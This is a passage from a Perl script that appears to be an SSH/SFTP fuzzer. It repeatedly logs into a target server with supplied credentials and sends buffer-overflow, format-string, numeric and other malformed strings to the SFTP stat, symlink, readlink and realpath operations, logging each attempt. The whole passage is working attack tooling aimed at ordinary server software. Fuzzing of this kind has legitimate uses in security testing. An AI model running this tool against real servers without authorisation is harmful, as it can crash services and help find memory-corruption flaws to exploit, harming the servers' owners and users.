$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $stat = $sftpfuzz->stat($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $stat = $sftpfuzz->stat($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $stat = $sftpfuzz->stat($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $stat = $sftpfuzz->stat($fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[symlink] STAGE #9 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $symlink = $sftpfuzz->symlink("test", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $symlink = $sftpfuzz->symlink("test", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $symlink = $sftpfuzz->symlink("test", $fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $symlink = $sftpfuzz->symlink("test", $fuzzssh); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[symlink] STAGE #10 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $symlink = $sftpfuzz->symlink($fuzzssh, "test"); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $symlink = $sftpfuzz->symlink($fuzzssh, "test"); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $symlink = $sftpfuzz->symlink($fuzzssh, "test"); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $symlink = $sftpfuzz->symlink($fuzzssh, "test"); $ssh2->disconnect(); }

print "\nFuzzing [SFTP]->[readlink] STAGE #11 COMPLETE...";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $readlink = $sftpfuzz->readlink($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $readlink = $sftpfuzz->readlink($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $readlink = $sftpfuzz->readlink($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $readlink = $sftpfuzz->readlink($fuzzssh); $ssh2->disconnect(); }

print "\n+Completing+ Fuzzing [SFTP]->[realpath] STAGE #12 COMPLETE...\n\n";
foreach(@overflow) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $realpath = $sftpfuzz->realpath($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@fmtstring) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $realpath = $sftpfuzz->realpath($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@numbers) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $realpath = $sftpfuzz->realpath($fuzzssh); $ssh2->disconnect(); }
sleep(1);
foreach(@miscbugs) { $ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port) || die "\nError: Connection Refused!\n"; open(FD, '>>sshfuzz.log'); print FD $host . "\n" . $_ . "\n\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$fuzzssh = $_; $sftpfuzz = $ssh2->sftp(); $realpath = $sftpfuzz->realpath($fuzzssh); $ssh2->disconnect(); }

close(FD); close(FDD); close(FDDD); close(FDDDD);

exit; 
